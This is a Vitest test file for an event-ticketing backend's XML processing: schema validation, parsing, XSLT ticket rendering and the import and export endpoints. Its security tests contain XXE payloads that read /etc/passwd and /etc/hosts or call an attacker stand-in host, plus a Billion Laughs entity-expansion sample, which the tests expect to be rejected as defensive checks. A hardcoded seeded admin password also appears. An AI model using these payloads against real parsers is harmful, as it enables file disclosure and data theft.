import { describe, it, expect, beforeAll } from 'vitest';
import request from 'supertest';
import { app } from '../app.js';
import { db } from '../config/db.js';
import { AuthService } from '../services/auth.service.js';
import {
  XmlSecurityService,
  XmlLintService,
  XmlDomService,
  XmlXsltService,
} from '../services/xml/index.js';

describe('XML Processing Engine (Phase 3)', () => {
  let attendeeToken = '';
  let organizerToken = '';
  let adminToken = '';
  let sampleEventId = '';
  let sampleTicketId = '';
  let importedEventId = '';

  beforeAll(async () => {
    // 1. Create attendee and organizer users
    const attendeeRes = await AuthService.register({
      email: `attendee.xml.${Date.now()}@example.com`,
      password: 'Password123!',
      name: 'XML Attendee Tester',
      phone: '+919988776655',
      role: 'attendee',
    });
    attendeeToken = attendeeRes.token;

    const organizerRes = await AuthService.register({
      email: `organizer.xml.${Date.now()}@example.com`,
      password: 'Password123!',
      name: 'XML Organizer Tester',
      phone: '+919988776656',
      role: 'organizer',
    });
    organizerToken = organizerRes.token;

    // Login as seeded admin for platform-wide test operations
    const adminLoginRes = await AuthService.login({
      email: 'admin@pulsepass.dev',
      password: 'Admin@PulsePass2026!',
    });
    adminToken = adminLoginRes.token;

    // 2. Fetch sample event
    const evRes = await db.query<{ id: string }>('SELECT id FROM events LIMIT 1;');
    if (evRes.rows[0]) {
      sampleEventId = evRes.rows[0].id;
    }

    // 3. Fetch sample ticket
    const tktRes = await db.query<{ id: string }>('SELECT id FROM tickets LIMIT 1;');
    if (tktRes.rows[0]) {
      sampleTicketId = tktRes.rows[0].id;
    }
  });

  describe('1. DTD Validation (xmllint & DTD Grammar Engine)', () => {
    const validManifestXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE event SYSTEM "event.dtd">
<event version="1.0" status="published">
  <title>Electronic Wave Fest 2026</title>
  <slug>electronic-wave-fest-2026</slug>
  <description>High energy progressive electronic music festival in Whitefield.</description>
  <category>Music</category>
  <venue>
    <name>E-City Arena Grounds</name>
    <address>Electronic City Phase 1</address>
    <city>Bengaluru</city>
    <state>Karnataka</state>
    <postal_code>560100</postal_code>
    <capacity>5000</capacity>
  </venue>
  <tiers>
    <tier currency="INR">
      <name>Early Bird Pass</name>
      <description>General admission entry</description>
      <price_paise>99900</price_paise>
      <capacity>1000</capacity>
    </tier>
    <tier currency="INR">
      <name>VIP Access</name>
      <price_paise>249900</price_paise>
      <capacity>200</capacity>
    </tier>
  </tiers>
</event>`;

    it('validates a correct event manifest against event.dtd', async () => {
      const result = await XmlLintService.validateDtd(validManifestXml);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('rejects an event manifest with illegal tags or broken hierarchy', async () => {
      const invalidXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE event SYSTEM "event.dtd">
<event>
  <unknown_tag>Illegal Element</unknown_tag>
</event>`;
      const result = await XmlLintService.validateDtd(invalidXml);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('rejects an event manifest missing DOCTYPE declaration', async () => {
      const missingDoctypeXml = `<?xml version="1.0" encoding="UTF-8"?>
<event>
  <title>No Doctype</title>
</event>`;
      const result = await XmlLintService.validateDtd(missingDoctypeXml);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('DOCTYPE'))).toBe(true);
    });
  });

  describe('2. XSD Validation (xmllint WebAssembly)', () => {
    it('validates a compliant ticket tier against tier.xsd', async () => {
      const validTierXml = `<?xml version="1.0" encoding="UTF-8"?>
<tier currency="INR">
  <name>Super Early Bird</name>
  <description>Discounted pass for first 100 fans</description>
  <price_paise>49900</price_paise>
  <capacity>100</capacity>
</tier>`;

      const result = await XmlLintService.validateXsd(validTierXml);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('rejects a tier with non-integer or negative price_paise', async () => {
      const invalidPriceTierXml = `<?xml version="1.0" encoding="UTF-8"?>
<tier currency="INR">
  <name>Invalid Price Tier</name>
  <price_paise>not_a_number</price_paise>
  <capacity>100</capacity>
</tier>`;

      const result = await XmlLintService.validateXsd(invalidPriceTierXml);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('rejects a tier with capacity zero (capacity must be positiveInteger >= 1)', async () => {
      const zeroCapacityTierXml = `<?xml version="1.0" encoding="UTF-8"?>
<tier currency="INR">
  <name>Zero Capacity Tier</name>
  <price_paise>1000</price_paise>
  <capacity>0</capacity>
</tier>`;

      const result = await XmlLintService.validateXsd(zeroCapacityTierXml);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  describe('3. XML Security (XXE & Billion Laughs Defense)', () => {
    it('blocks XXE attacks with SYSTEM entity identifier', () => {
      const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE event [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<event>
  <title>&xxe;</title>
</event>`;

      expect(() => {
        XmlSecurityService.sanitizeAndValidate(xxePayload);
      }).toThrowError(/SYSTEM identifier is forbidden/i);
    });

    it('blocks XXE attacks with remote protocol handlers', () => {
      const xxeHttpPayload = `<?xml version="1.0"?>
<!DOCTYPE event [
  <!ENTITY xxe PUBLIC "attacker" "http://evil.com/leak">
]>
<event>
  <title>&xxe;</title>
</event>`;

      expect(() => {
        XmlSecurityService.sanitizeAndValidate(xxeHttpPayload);
      }).toThrowError(/external PUBLIC URI is forbidden/i);
    });

    it('blocks Billion Laughs entity expansion attack', () => {
      const billionLaughsPayload = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;">
]>
<event>
  <title>&lol2;</title>
</event>`;

      expect(() => {
        XmlSecurityService.sanitizeAndValidate(billionLaughsPayload);
      }).toThrowError(/entity expansion detected|Billion Laughs/i);
    });
  });

  describe('4. XML DOM Parsing and Serialization (@xmldom/xmldom)', () => {
    it('parses valid event manifest into structured domain object', () => {
      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<event status="published">
  <title>Indie Rock Night</title>
  <slug>indie-rock-night</slug>
  <description>Live indie alternative concert</description>
  <category>Music</category>
  <venue>
    <name>Hard Rock Cafe</name>
    <address>Banjara Hills Rd 1</address>
    <city>Hyderabad</city>
    <state>Telangana</state>
    <postal_code>500034</postal_code>
    <capacity>450</capacity>
  </venue>
  <tiers>
    <tier currency="INR">
      <name>General Admission</name>
      <description>Floor access</description>
      <price_paise>120000</price_paise>
      <capacity>350</capacity>
    </tier>
  </tiers>
</event>`;

      const manifest = XmlDomService.parseEventXml(xml);
      expect(manifest.title).toBe('Indie Rock Night');
      expect(manifest.slug).toBe('indie-rock-night');
      expect(manifest.venue.name).toBe('Hard Rock Cafe');
      expect(manifest.venue.capacity).toBe(450);
      expect(manifest.tiers).toHaveLength(1);
      expect(manifest.tiers[0]?.price_paise).toBe(120000);
      expect(manifest.tiers[0]?.capacity).toBe(350);
    });
  });

  describe('5. XSLT Printable Ticket Transformation', () => {
    it('transforms ticket XML into perforated printable HTML pass', async () => {
      const ticketXml = `<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <ticket_code>PNP-ELEC2026-ABCD1234</ticket_code>
  <security_hash>a1b2c3d4e5f67890abcdef1234567890</security_hash>
  <status>valid</status>
  <attendee_name>Rishika Sharma</attendee_name>
  <attendee_email>rishika@example.com</attendee_email>
  <unit_price_paise>150000</unit_price_paise>
  <tier_name>VIP All-Access</tier_name>
  <event_title>Electric Horizon 2026</event_title>
  <event_start_time>Friday, 24 October 2026, 7:00 PM</event_start_time>
  <venue_name>HITEX Exhibition Center</venue_name>
  <venue_city>Hyderabad</venue_city>
  <qr_code_data_url>data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...</qr_code_data_url>
</ticket>`;

      const html = await XmlXsltService.transformTicketXml(ticketXml);

      // Verify HTML document structure and design tokens
      expect(html).toContain('<!DOCTYPE html>');
      expect(html).toContain('Pulse &amp; Pass');
      expect(html).toContain('Electric Horizon 2026');
      expect(html).toContain('Rishika Sharma');
      expect(html).toContain('VIP All-Access');
      expect(html).toContain('PNP-ELEC2026-ABCD1234');

      // Verify Perforated ticket styling classes
      expect(html).toContain('ticket-container');
      expect(html).toContain('perforation');
      expect(html).toContain('perforation-notch-left');
      expect(html).toContain('perforation-notch-right');
      expect(html).toContain('ticket-stub');
      expect(html).toContain('--ink: #0A0D14');
      expect(html).toContain('--cyan: #00E5FF');
      expect(html).toContain('--amber: #FFB300');
    });
  });

  describe('6. HTTP API Endpoints', () => {
    it('GET /api/v1/events/:id/xml exports event manifest XML conforming to DTD', async () => {
      const res = await request(app).get(`/api/v1/events/${sampleEventId}/xml`);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toContain('application/xml');
      expect(res.headers['content-disposition']).toContain('attachment; filename=');
      expect(res.text).toContain('<!DOCTYPE event SYSTEM "event.dtd">');
      expect(res.text).toContain('<event');
      expect(res.text).toContain('<tiers>');

      // Validate exported XML against DTD schema
      const dtdCheck = await XmlLintService.validateDtd(res.text);
      expect(dtdCheck.valid).toBe(true);
    });

    it('POST /api/v1/events/import-xml allows organizer to import valid XML manifest', async () => {
      const manifestXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE event SYSTEM "event.dtd">
<event version="1.0" status="published">
  <title>Acoustic Unplugged Session ${Date.now()}</title>
  <slug>acoustic-unplugged-${Date.now()}</slug>
  <description>Intimate unplugged acoustic music evening with classical artists.</description>
  <category>Music</category>
  <venue>
    <name>Chowdiah Memorial Hall</name>
    <address>16th Cross, Malleswaram</address>
    <city>Bengaluru</city>
    <state>Karnataka</state>
    <postal_code>560003</postal_code>
    <capacity>1000</capacity>
  </venue>
  <tiers>
    <tier currency="INR">
      <name>Front Row Premium</name>
      <description>Reserved front seating</description>
      <price_paise>150000</price_paise>
      <capacity>150</capacity>
    </tier>
    <tier currency="INR">
      <name>Balcony Classic</name>
      <price_paise>65000</price_paise>
      <capacity>350</capacity>
    </tier>
  </tiers>
</event>`;

      const res = await request(app)
        .post('/api/v1/events/import-xml')
        .set('Authorization', `Bearer ${organizerToken}`)
        .set('Content-Type', 'application/xml')
        .send(manifestXml);

      expect(res.status).toBe(201);
      expect(res.body).toHaveProperty('success', true);
      expect(res.body).toHaveProperty('event');
      expect(res.body.event.venue.city).toBe('Bengaluru');
      expect(res.body.event.tiers).toHaveLength(2);

      // Store imported event ID for export-sax test
      importedEventId = res.body.event.id;
    });

    it('POST /api/v1/events/import-xml rejects attendee role (403 Forbidden)', async () => {
      const manifestXml = `<?xml version="1.0"?>
<!DOCTYPE event SYSTEM "event.dtd">
<event><title>Unauthorized</title></event>`;

      const res = await request(app)
        .post('/api/v1/events/import-xml')
        .set('Authorization', `Bearer ${attendeeToken}`)
        .set('Content-Type', 'application/xml')
        .send(manifestXml);

      expect(res.status).toBe(403);
    });

    it('POST /api/v1/events/import-xml rejects XXE attack payload with 400', async () => {
      const xxeAttackXml = `<?xml version="1.0"?>
<!DOCTYPE event [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<event>
  <title>&xxe;</title>
</event>`;

      const res = await request(app)
        .post('/api/v1/events/import-xml')
        .set('Authorization', `Bearer ${organizerToken}`)
        .set('Content-Type', 'application/xml')
        .send(xxeAttackXml);

      expect(res.status).toBe(400);
      expect(res.body.error).toContain('XXE_INJECTION_DETECTED');
    });

    it('POST /api/v1/events/import-xml rejects DTD violation with 400 DTD_VALIDATION_ERROR', async () => {
      const badDtdXml = `<?xml version="1.0"?>
<!DOCTYPE event SYSTEM "event.dtd">
<event>
  <unrecognized_element>Bad</unrecognized_element>
</event>`;

      const res = await request(app)
        .post('/api/v1/events/import-xml')
        .set('Authorization', `Bearer ${organizerToken}`)
        .set('Content-Type', 'application/xml')
        .send(badDtdXml);

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('DTD_VALIDATION_ERROR');
    });

    it('GET /api/v1/tickets/:id/print returns XSLT-rendered printable ticket HTML for admin', async () => {
      if (!sampleTicketId) return;

      const res = await request(app)
        .get(`/api/v1/tickets/${sampleTicketId}/print`)
        .set('Authorization', `Bearer ${adminToken}`);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toContain('text/html');
      expect(res.text).toContain('<!DOCTYPE html>');
      expect(res.text).toContain('ticket-container');
      expect(res.text).toContain('perforation');
    });

    it('GET /api/v1/organizer/events/:id/export-sax streams ticket export XML for organizer', async () => {
      const eventToExport = importedEventId || sampleEventId;
      const token = importedEventId ? organizerToken : adminToken;

      const res = await request(app)
        .get(`/api/v1/organizer/events/${eventToExport}/export-sax`)
        .set('Authorization', `Bearer ${token}`);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toContain('application/xml');
      expect(res.headers['content-disposition']).toContain('attachment; filename=');
      expect(res.text).toContain('<?xml version="1.0" encoding="UTF-8"?>');
      expect(res.text).toContain('<ticket_export');
      expect(res.text).toContain('</ticket_export>');
    });
  });
});
